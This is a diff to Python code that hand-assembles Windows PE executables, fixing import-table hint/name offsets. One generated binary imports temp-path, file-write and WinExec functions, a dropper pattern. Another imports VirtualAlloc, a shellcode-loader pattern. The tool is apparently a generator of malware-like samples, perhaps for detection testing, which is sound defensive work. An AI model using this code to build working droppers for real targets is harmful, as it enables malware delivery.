@@ -838,47 +838,34 @@ End Function
 
         # ILT for kernel32 at 0x3C (6 entries)
         k32_names = ['ExitProcess', 'GetTempPathA', 'CreateFileA', 'WriteFile', 'CloseHandle', 'WinExec']
-        k32_hint_offs = [0x140, 0x14C, 0x158, 0x164, 0x170, 0x17C]
+        all_hint_names = k32_names + ['MessageBoxA']
+        # Compute hint/name offsets dynamically (prevents bytearray expansion bugs)
+        hint_offs = []
+        _off = 0x140
+        for name in all_hint_names:
+            hint_offs.append(_off)
+            _off += 2 + len(name) + 1
+            _off = (_off + 1) & ~1  # align to 2
+        k32_hint_offs = hint_offs[:len(k32_names)]
+        mb_hint_off = hint_offs[len(k32_names)]
+
         k32_ilt_rva = rdata_rva + 0x3C
         k32_iat_rva = rdata_rva + 0x6C
-        for i, (name, hint_off) in enumerate(zip(k32_names, k32_hint_offs)):
+        for i, hint_off in enumerate(k32_hint_offs):
             struct.pack_into('<Q', rdata, 0x3C + i*8, rdata_rva + hint_off)
             struct.pack_into('<Q', rdata, 0x6C + i*8, rdata_rva + hint_off)
 
         # ILT for user32 at 0x9C (1 entry)
-        struct.pack_into('<Q', rdata, 0x9C, rdata_rva + 0x184)  # → MessageBoxA
-        struct.pack_into('<Q', rdata, 0xA4, rdata_rva + 0x184)  # IAT
-
-        # Hint/Name entries
-        rdata[0xAC:0xAE] = b'\x00\x00'  # Hint for ExitProcess
-        rdata[0xAE:0xB9] = b'ExitProcess\x00'
-        rdata[0xB9:0xBB] = b'\x00\x00'
-        rdata[0xBB:0xC7] = b'GetTempPathA\x00'
-        rdata[0xC7:0xC9] = b'\x00\x00'
-        rdata[0xC9:0xD4] = b'CreateFileA\x00'
-        rdata[0xD4:0xD6] = b'\x00\x00'
-        rdata[0xD6:0xDF] = b'WriteFile\x00'
-        rdata[0xDF:0xE1] = b'\x00\x00'
-        rdata[0xE1:0xEC] = b'CloseHandle\x00'
-        rdata[0xEC:0xEE] = b'\x00\x00'
-        rdata[0xEE:0xF5] = b'WinExec\x00'
-        rdata[0xF5:0xF7] = b'\x00\x00'
-        rdata[0xF7:0x102] = b'MessageBoxA\x00'
+        struct.pack_into('<Q', rdata, 0x9C, rdata_rva + mb_hint_off)
+        struct.pack_into('<Q', rdata, 0xA4, rdata_rva + mb_hint_off)
 
         # DLL name strings
         rdata[0x120:0x12D] = b'kernel32.dll\x00'
-        rdata[0x130:0x139] = b'user32.dll\x00'
+        rdata[0x130:0x13B] = b'user32.dll\x00'
 
-        # Hint/Name at computed offsets
-        # ExitProcess at 0x140
-        rdata[0x140:0x142] = b'\x00\x00'
-        rdata[0x142:0x14D] = b'ExitProcess\x00'
-        # GetTempPathA at 0x14C (adjust — overlapping, use separate layout)
-        # Actually let me use a cleaner layout — just past the DLL names
-
-        # Re-do Hint/Name at 0x140 with proper spacing
+        # Hint/Name entries at dynamically computed offsets
         off = 0x140
-        for name in k32_names + ['MessageBoxA']:
+        for name in all_hint_names:
             rdata[off:off+2] = b'\x00\x00'  # Hint
             rdata[off+2:off+2+len(name)] = name.encode()
             rdata[off+2+len(name)] = 0  # null terminator
@@ -1816,16 +1803,16 @@ End Function
         struct.pack_into('<I', rdata, 16, rdata_rva + 0x40)
         # ILT[0] VirtualAlloc, ILT[1] ExitProcess
         struct.pack_into('<Q', rdata, 0x28, rdata_rva + 0x70)
-        struct.pack_into('<Q', rdata, 0x30, rdata_rva + 0x7E)
+        struct.pack_into('<Q', rdata, 0x30, rdata_rva + 0x80)
         # IAT[0] VirtualAlloc, IAT[1] ExitProcess
         struct.pack_into('<Q', rdata, 0x40, rdata_rva + 0x70)
-        struct.pack_into('<Q', rdata, 0x48, rdata_rva + 0x7E)
+        struct.pack_into('<Q', rdata, 0x48, rdata_rva + 0x80)
         # Hint/Name VirtualAlloc
         struct.pack_into('<H', rdata, 0x70, 0)
-        rdata[0x72:0x7E] = b'VirtualAlloc\x00'
+        rdata[0x72:0x7F] = b'VirtualAlloc\x00'
         # Hint/Name ExitProcess
-        struct.pack_into('<H', rdata, 0x7E, 0)
-        rdata[0x80:0x8C] = b'ExitProcess\x00'
+        struct.pack_into('<H', rdata, 0x80, 0)
+        rdata[0x82:0x8E] = b'ExitProcess\x00'
         # kernel32.dll
         rdata[0x60:0x6D] = b'kernel32.dll\x00'
         pe[rdata_file_off:rdata_file_off+0x200] = rdata
